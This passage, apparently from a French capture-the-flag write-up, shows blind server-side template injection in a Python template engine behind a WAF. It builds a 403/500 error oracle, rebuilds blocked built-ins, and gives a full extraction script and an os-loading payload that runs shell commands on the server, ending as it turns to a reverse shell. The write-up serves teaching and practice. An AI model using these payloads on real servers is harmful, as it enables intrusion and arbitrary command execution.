+<p>Notre cécité est à ce point la plus grosse épine dans notre pied. Essayons de retrouver la vue. Avec les <em>payloads</em> suivants, on peut déclencher une erreur 403 ou une erreur 500 en fonction de la valeur d&rsquo;une variable :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ [<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">None</span>][X] <span style="color:#f92672">+</span> <span style="color:#ae81ff">123</span> }}
+</span></span></code></pre></div><p>Si <code>X</code> vaut <code>0</code>, pas d&rsquo;erreur, le résultat est <code>123</code> et on obtient l&rsquo;erreur <em>403</em> du <em>WAF</em>. Mais si <code>X</code> vaut <code>1</code>, on exécute l&rsquo;opération <code>None + 123</code>, qui est impossible, et l&rsquo;erreur Python <code>TypeError: unsupported operand type(s) for +: 'NoneType' and 'int'</code> fait terminer la requête avec un code d&rsquo;erreur <em>500</em>.</p>
+<p>Puisque nous pouvons faire dépendre le code d&rsquo;erreur (403 ou 500) d&rsquo;une valeur calculée par notre script, on peut extraire un nombre bit par bit (403 -&gt; 0, 500 -&gt; 1, ou l&rsquo;inverse). Essayons désormais d&rsquo;extraire une chaîne de caractère. Une fois ceci fait, on pourra extraire <code>str(''.__class__.mro()[1].__subclasses__())</code> afin de lister les classes disponibles côté serveur.</p>
+<p>On construit petit à petit un script <em>inline</em> (ie. sur une seule ligne, c&rsquo;est mieux pour l&rsquo;injecter dans un <em>template</em>) permettant l&rsquo;extraction bit à bit d&rsquo;une chaîne entière. <code>I</code> note ici l&rsquo;index du caractère à récupérer dans le <em>string</em>, et <code>J</code> l&rsquo;indice du chiffre binaire du code ASCII 8-bit de ce caractère. <code>S</code> est la chaîne à extraire.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> S<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;toto&#34;</span>; I<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; J<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> S[I]
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;t&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> ord(S[I])
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">116</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> bin(ord(S[I]))
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0b1110100&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> bin(ord(S[I]))[<span style="color:#ae81ff">2</span>:]
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;1110100&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> bin(ord(S[I]))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;01110100&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> bin(ord(S[I]))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[J]
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> int(bin(ord(S[I]))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[J])
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">None</span>][int(bin(ord(S[I]))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[J])]<span style="color:#f92672">+</span><span style="color:#ae81ff">123</span>
+</span></span></code></pre></div><p>Maintenant il suffit d&rsquo;incrémenter I pour chaque caractère à récupérer, en faisant varier J de 0 à 7 (inclus), pour récupérer une chaîne de caractère arbitraire.</p>
+<h2 id="reconstruction-de-built-ins-inaccessibles">Reconstruction de built-ins inaccessibles</h2>
+<p>Une petite complication subsiste, mais c&rsquo;est trois fois rien, soyez rassuré. Nous n&rsquo;avons pas accès aux fonctions <em>built-ins</em> <code>int</code>, <code>bin</code>, <code>ord</code> et <code>str</code>. Heureusement, on peut les retrouver ou les remplacer facilemenent par des fonctions équivalentes.</p>
+<p>Pour retrouver les fonctions <code>int</code> et <code>str</code>, on peut remonter depuis <code>0</code> et <code>&quot;&quot;</code> avec les mots-clés magiques Python sur les objets :</p>
+<p>On peut désormais convertir en <code>int</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> (<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>__class__
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">int</span><span style="color:#e6db74">&#39;&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> (<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>__class__(<span style="color:#e6db74">&#34;123&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">123</span>
+</span></span></code></pre></div><p>Et en <code>str</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>__class__
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">str</span><span style="color:#e6db74">&#39;&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>__class__([<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>])
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[1, 2, 3]&#39;</span>
+</span></span></code></pre></div><p>Pour ce qui est de l&rsquo;équivalent de <code>bin(123)[2:]</code>, qui donne l&rsquo;écriture binaire d&rsquo;un nombre sans le préfixe <code>0b</code>, on peut utiliser les fonctions de <em>string formatting</em> des chaînes de caractères Python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:b}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#ae81ff">123</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;1111011&#39;</span>
+</span></span></code></pre></div><p>Il nous reste <code>ord</code>, cette fameuse fonction qui donne à partir d&rsquo;un caractère son code <em>ASCII</em>. Nous allons devoir ruser. Munissons-nous d&rsquo;une chaîne de caractère contenant tous les caractères <em>ASCII</em> dans l&rsquo;ordre.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>)])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span style="color:#e6db74"> !&#34;#$%&amp;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">]^_`abcdefghijklmnopqrstuvwxyz{|}~</span><span style="color:#ae81ff">\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span style="color:#e6db74">¡¢£¤¥¦§¨©ª«¬</span><span style="color:#ae81ff">\xad</span><span style="color:#e6db74">®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ&#39;</span>
+</span></span></code></pre></div><p>Dans cette liste magique, l&rsquo;indice d&rsquo;un caractère est précisément son code <code>ASCII</code>.</p>
+<p>On peut donc remplacer&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">97</span>
+</span></span></code></pre></div><p>par&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span style="color:#e6db74"> !&#34;#$%&amp;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">]^_`abcdefghijklmnopqrstuvwxyz{|}~</span><span style="color:#ae81ff">\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span style="color:#e6db74">¡¢£¤¥¦§¨©ª«¬</span><span style="color:#ae81ff">\xad</span><span style="color:#e6db74">®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ&#39;</span><span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">97</span>
+</span></span></code></pre></div><p>Maintenant que nous avons toutes les pièces, on peut retrouver notre <em>payload</em> initial :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">None</span>][int(bin(ord(S[I]))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[J])]<span style="color:#f92672">+</span><span style="color:#ae81ff">123</span>
+</span></span></code></pre></div><p>&hellip; et le réécrire avec les fonctions de substitution, auxquelles nous avons accès.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">None</span>][(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>__class__(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:b}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span style="color:#e6db74"> !&#34;#$%&amp;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">]^_`abcdefghijklmnopqrstuvwxyz{|}~</span><span style="color:#ae81ff">\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span style="color:#e6db74">¡¢£¤¥¦§¨©ª«¬</span><span style="color:#ae81ff">\xad</span><span style="color:#e6db74">®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ&#39;</span><span style="color:#f92672">.</span>index((S)[<span style="color:#ae81ff">0</span>]))<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[<span style="color:#ae81ff">0</span>])]<span style="color:#f92672">+</span><span style="color:#ae81ff">123</span>
+</span></span></code></pre></div><h2 id="script-local-pour-dump-une-chaîne-bit-par-bit">Script local pour dump une chaîne bit par bit</h2>
+<p>Nous avons notre orange, mais il nous manque encore le presse-agrumes. Il faut désormais faire un petit script qui ira interroger le serveur autant de fois que nécessaire pour récupérer tous les bits d&rsquo;une chaîne de caractères du serveur, et la recomposer en local. Ici, on essaye d&rsquo;extraire <code>''.__class__(''.__class__.mro()[1].__subclasses__())</code>, qui nous donne la liste des classes importées sur le serveur.</p>
+<p>Le <em>payload</em> complet à envoyer dans le formulaire est le suivant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{[<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">None</span>][(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>__class__(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:b}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span style="color:#e6db74"> !&#34;#$%&amp;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">]^_`abcdefghijklmnopqrstuvwxyz{|}~</span><span style="color:#ae81ff">\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span style="color:#e6db74">¡¢£¤¥¦§¨©ª«¬</span><span style="color:#ae81ff">\xad</span><span style="color:#e6db74">®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ&#39;</span><span style="color:#f92672">.</span>index((<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>__subclasses__()))[<span style="color:#ae81ff">0</span>]))<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[<span style="color:#ae81ff">0</span>])]<span style="color:#f92672">+</span><span style="color:#ae81ff">123</span>}}
+</span></span></code></pre></div><p>On récupère le format de la requête à envoyer depuis l&rsquo;onglet &ldquo;Réseau&rdquo; de Firefox, après avoir envoyé le <em>payload</em> dans un commentaire (en copiant la requête au format <code>CURL</code> et en adaptant à <code>python-requests</code>). Les coefficients <code>i</code> et <code>j</code> indiquent respectivement l&rsquo;index du caractère dans la chaîne, et du bit à récupérer au sein de ce caractère.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_bit</span>(i:int ,j:int):
+</span></span><span style="display:flex;"><span>    request_body<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;nickname=%7B%7B%5B0%2CNone%5D%5B</span><span style="color:#e6db74">%280%</span><span style="color:#e6db74">29.__class__</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">22%7B%3Ab%7D%22.format</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">27%5Cx00%5Cx01%5Cx02%5Cx03%5Cx04%5Cx05%5Cx06%5Cx07%5Cx08%5Ct%5Cn%5Cx0b%5Cx0c%5Cr%5Cx0e%5Cx0f%5Cx10%5Cx11%5Cx12%5Cx13%5Cx14%5Cx15%5Cx16%5Cx17%5Cx18%5Cx19%5Cx1a%5Cx1b%5Cx1c%5Cx1d%5Cx1e%5Cx1f+</span><span style="color:#e6db74">%21%</span><span style="color:#e6db74">22</span><span style="color:#e6db74">%23%</span><span style="color:#e6db74">24</span><span style="color:#e6db74">%25%</span><span style="color:#e6db74">26%5C</span><span style="color:#e6db74">%27%</span><span style="color:#e6db74">28%29*%2B%2C-.</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">0123456789%3A%3B%3C%3D</span><span style="color:#e6db74">%3E%3F</span><span style="color:#e6db74">%40ABCDEFGHIJKLMNOPQRSTUVWXYZ%5B%5C%5C%5D</span><span style="color:#e6db74">%5E</span><span style="color:#e6db74">_</span><span style="color:#e6db74">%60a</span><span style="color:#e6db74">bcdefghijklmnopqrstuvwxyz%7B%7C%7D</span><span style="color:#e6db74">%7E</span><span style="color:#e6db74">%5Cx7f%5Cx80%5Cx81%5Cx82%5Cx83%5Cx84%5Cx85%5Cx86%5Cx87%5Cx88%5Cx89%5Cx8a%5Cx8b%5Cx8c%5Cx8d%5Cx8e%5Cx8f%5Cx90%5Cx91%5Cx92%5Cx93%5Cx94%5Cx95%5Cx96%5Cx97%5Cx98%5Cx99%5Cx9a%5Cx9b%5Cx9c%5Cx9d%5Cx9e%5Cx9f%5Cxa0%C2%A1%C2%A2%C2%A3%C2%A4%C2%A5%C2%A6%C2%A7%C2%A8%C2%A9%C2%AA%C2%AB%C2%AC%5Cxad%C2%AE%C2%AF%C2%B0%C2%B1%C2%B2%C2%B3%C2%B4%C2%B5%C2%B6%C2%B7%C2%B8%C2%B9%C2%BA%C2%BB%C2%BC%C2%BD%C2%BE%C2%BF%C3</span><span style="color:#e6db74">%80%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%81%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%82%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%83%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%84%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%85%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%86%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%87%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%88%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%89%</span><span style="color:#e6db74">C3%8A%C3%8B%C3%8C%C3%8D%C3</span><span style="color:#e6db74">%8E</span><span style="color:#e6db74">%C3</span><span style="color:#e6db74">%8F</span><span style="color:#e6db74">%C3</span><span style="color:#e6db74">%90%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%91%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%92%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%93%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%94%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%95%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%96%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%97%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%98%</span><span style="color:#e6db74">C3</span><span style="color:#e6db74">%99%</span><span style="color:#e6db74">C3%9A%C3%9B%C3%9C%C3%9D%C3</span><span style="color:#e6db74">%9E</span><span style="color:#e6db74">%C3</span><span style="color:#e6db74">%9F</span><span style="color:#e6db74">%C3%A0%C3%A1%C3%A2%C3%A3%C3%A4%C3%A5%C3%A6%C3%A7%C3%A8%C3%A9%C3%AA%C3%AB%C3%AC%C3%AD%C3%AE%C3%AF%C3%B0%C3%B1%C3%B2%C3%B3%C3%B4%C3%B5%C3%B6%C3%B7%C3%B8%C3%B9%C3%BA%C3%BB%C3%BC%C3%BD%C3%BE%C3%BF%27.index</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">28</span><span style="color:#e6db74">%27%</span><span style="color:#e6db74">27.__class__</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">27%27.__class__.mro</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">29%5B1%5D.__subclasses__</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">29</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">29%5B&#39;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;%5D</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">29.zfill</span><span style="color:#e6db74">%288%</span><span style="color:#e6db74">29%5B&#39;</span><span style="color:#f92672">+</span>str(j)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;%5D</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">5D%2B123%7D%7D&amp;comment=a&amp;preview=Previsualiser&#39;</span>
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>}
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://localhost:8000/post/2/&#34;</span>, data<span style="color:#f92672">=</span>request_body, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(response<span style="color:#f92672">.</span>status_code<span style="color:#f92672">!=</span><span style="color:#ae81ff">403</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    one_byte <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>        one_byte<span style="color:#f92672">.</span>append(get_bit(i,j))
+</span></span><span style="display:flex;"><span>    one_char <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(map(str,one_byte)),<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    print(chr(one_char),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>,flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>En lançant en local ce script, on voit les lettres apparaître une par une à l&rsquo;écran :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">type</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>async_generator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>int<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytearray_iterator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytearray<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytes_iterator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytes<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>builtin_function_or_method<span style="color:#e6db74">&#39;&gt;,</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">...</span> ensemble des classes importées sur le serveur <span style="color:#f92672">...</span>]
+</span></span></code></pre></div><h2 id="importer-le-module-os">Importer le module <em>os</em></h2>
+<p>En parcourant les classes importées sur le serveur, on tombe sur <code>&lt;class '_frozen_importlib.BuiltinImporter'&gt;</code> à la position <code>104</code>. On peut s&rsquo;en servir pour importer <code>os</code> et exécuter des commandes arbitraires sur le serveur.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">104</span>]()<span style="color:#f92672">.</span>load_module(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;sleep 10&#34;</span>) }}
+</span></span></code></pre></div><p>En envoyant ce <em>payload</em> au serveur, on reçoit une erreur 403&hellip; après 10 secondes ! L&rsquo;injection de commande shell arbitraire est réussie.</p>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>Maintenant, on veut prendre le contrôle du serveur, alors on se rend, tout joyeux, car sachant que le flag n&rsquo;est pas très loin, sur <a href="https://www.revshells.com/" target="_blank">https://www.revshells.com/</a> pour récupérer notre <em>reverse shell</em> préféré.</p>
